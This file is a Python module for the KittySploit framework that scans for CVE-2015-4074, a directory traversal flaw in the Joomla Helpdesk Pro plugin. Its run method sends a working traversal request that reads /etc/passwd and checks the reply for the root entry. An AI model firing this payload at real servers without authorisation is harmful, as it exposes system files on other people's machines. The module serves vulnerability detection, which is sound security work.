#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Directory traversal vulnerability in the Helpdesk Pro plugin before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Helpdesk Pro plugin <1.4.0 - Local File Inclusion Detection',
        'description': 'Directory traversal vulnerability in the Helpdesk Pro plugin before 1.4.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the filename parameter in a ticket.download_attachment task.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'lfi', 'packetstorm', 'edb', 'joomla', 'plugin', 'helpdesk_pro_project', 'joomla\\!', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/132766/Joomla-Helpdesk-Pro-XSS-File-Disclosure-SQL-Injection.html',
            'https://www.exploit-db.com/exploits/37666/',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-4074',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4074',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2015-4074',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?option=com_helpdeskpro&task=ticket.download_attachment&filename=/../../../../../../../../../../../../etc/passwd&original_filename=AnyFileName.exe', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Helpdesk Pro plugin <1.4.0 - Local File Inclusion detected",
                path='/?option=com_helpdeskpro&task=ticket.download_attachment&filename=/../../../../../../../../../../../../etc/passwd&original_filename=AnyFileName.exe',
            )
            return True
        return False

